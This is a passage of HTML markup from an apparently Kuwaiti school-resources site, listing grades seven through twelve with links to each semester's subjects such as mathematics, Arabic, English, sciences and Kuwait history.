<a href="index-type.php?type1=183&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=183&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=183&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=183&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=183&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li> </ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف السابع : الفصل الثاني</p>  
 
                                     
 
<ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=184&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=184&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=184&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=184&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=184&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=184&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>  </ul>  

     </span>
</div>


</div>




 















































   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px;">الصف الثامن</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الثامن : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=185&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=185&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=185&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=185&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=185&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=185&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>
</ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الثامن : الفصل الثاني</p>  
 
                                     
 
           
     <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=186&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=186&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=186&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=186&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=186&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=186&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>
 </ul>  

     </span>
</div>


</div>



































 <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px;">الصف التاسع</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف التاسع : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=187&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=187&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=187&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=187&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=187&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=187&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li> 
</ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف التاسع : الفصل الثاني</p>  
 
                                     
 
           
     <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=188&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=188&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=188&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=188&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=188&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=188&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>
</ul>  

     </span>
</div>


</div>





 
</div>
          
         
         			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  				                      
<div class="grid-container1" >      
 
   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px; ">الصف العاشر</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف العاشر : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=189&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=189&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=189&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=189&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=189&amp;type=199" style="font-size:18px;color:;">الفيزياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=189&amp;type=200" style="font-size:18px;color:;">الكيمياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=189&amp;type=201" style="font-size:18px;color:;">الاحياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=189&amp;type=202" style="font-size:18px;color:;">تاريخ الكويت    </a>        </li>  </ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف العاشر : الفصل الثاني</p>  
 
                                     
 
<ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=190&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=190&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=190&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=190&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=190&amp;type=199" style="font-size:18px;color:;">الفيزياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=190&amp;type=200" style="font-size:18px;color:;">الكيمياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=190&amp;type=201" style="font-size:18px;color:;">الاحياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=190&amp;type=202" style="font-size:18px;color:;">تاريخ الكويت    </a>        </li> </ul>  

     </span>
</div>


</div>




 















































   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px;">الصف الحادي عشر علمي</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الحادي عشر علمي : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
 <li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=191&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=191&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=191&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=191&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=191&amp;type=199" style="font-size:18px;color:;">الفيزياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=191&amp;type=200" style="font-size:18px;color:;">الكيمياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=191&amp;type=201" style="font-size:18px;color:;">الاحياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=191&amp;type=203" style="font-size:18px;color:;">الجيولوجيا    </a>        </li>
</ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الحادي عشر علمي : الفصل الثاني</p>  
 
                                     
 
           
     <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=192&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=192&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=192&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=192&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=192&amp;type=199" style="font-size:18px;color:;">الفيزياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=192&amp;type=200" style="font-size:18px;color:;">الكيمياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=192&amp;type=201" style="font-size:18px;color:;">الاحياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=192&amp;type=203" style="font-size:18px;color:;">الجيولوجيا    </a>        </li>
 </ul>  

     </span>
</div>


</div>



































 <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px;">الصف الحادي عشر ادبي</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الحادي عشر ادبي : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=193&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=193&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=193&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=193&amp;type=205" style="font-size:18px;color:;">فرنسي    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=193&amp;type=206" style="font-size:18px;color:;">الاحصاء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=193&amp;type=207" style="font-size:18px;color:;">الجغرافيا    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=193&amp;type=208" style="font-size:18px;color:;">التاريخ    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=193&amp;type=209" style="font-size:18px;color:;">علم النفس    </a>        </li>
</ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الحادي عشر ادبي : الفصل الثاني</p>  
 
                                     
 
           
     <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=194&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=194&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=194&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=194&amp;type=205" style="font-size:18px;color:;">فرنسي    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=194&amp;type=206" style="font-size:18px;color:;">الاحصاء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=194&amp;type=207" style="font-size:18px;color:;">الجغرافيا    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=194&amp;type=208" style="font-size:18px;color:;">التاريخ    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=194&amp;type=209" style="font-size:18px;color:;">علم النفس    </a>        </li> 
</ul>  

     </span>
</div>


</div>





 
</div>	
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			<div class="grid-container1" >      
 
   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px; ">الصف الثاني عشر علمي</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الثاني عشر علمي : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=195&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=195&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=195&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=195&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=195&amp;type=199" style="font-size:18px;color:;">الفيزياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=195&amp;type=200" style="font-size:18px;color:;">الكيمياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=195&amp;type=201" style="font-size:18px;color:;">الاحياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=195&amp;type=204" style="font-size:18px;color:;">الدستور    </a>        </li>   </ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الثاني عشر علمي : الفصل الثاني</p>  
 
                                     
 
<ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();"> 
 <li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=196&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=196&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=196&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
